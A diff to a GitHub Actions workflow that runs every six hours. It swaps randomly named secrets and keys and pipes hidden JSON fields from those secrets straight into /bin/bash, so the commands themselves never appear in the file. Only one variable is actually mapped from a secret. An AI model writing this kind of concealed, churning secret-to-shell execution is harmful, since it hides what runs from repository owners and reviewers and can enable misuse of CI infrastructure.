@@ -1,21 +1,26 @@
 name: botsnow2
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 4/6 * * *'
+    - cron: '37 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: botsnow2
         env:
-          cvbvy4: ${{ secrets.cvbvy4 }}
+          obfh5: ${{ secrets.obfh5 }}
         run: |
-          echo $cvbvy4 | jq -r .a02393 | /bin/bash
-          echo $iv184 | jq -r .is72 | /bin/bash
-          echo $yvg45205 | jq -r .tait07430 | /bin/bash
-          echo $srxcs54 | jq -r .t32447 | /bin/bash
+          echo $obfh5 | jq -r .pihku55983 | /bin/bash
+          echo $plkjp94505 | jq -r .iwc964 | /bin/bash
+          echo $hqxm59 | jq -r .gcun661 | /bin/bash
+          echo $c158 | jq -r .vpmp9924 | /bin/bash
+          echo $k7 | jq -r .hbq5097 | /bin/bash
+          echo $cnsjj28333 | jq -r .pkg646 | /bin/bash
+          echo $u2345 | jq -r .axe1 | /bin/bash
+          echo $ndgy9 | jq -r .ff0004 | /bin/bash
+          echo $m3351 | jq -r .hg135 | /bin/bash
 
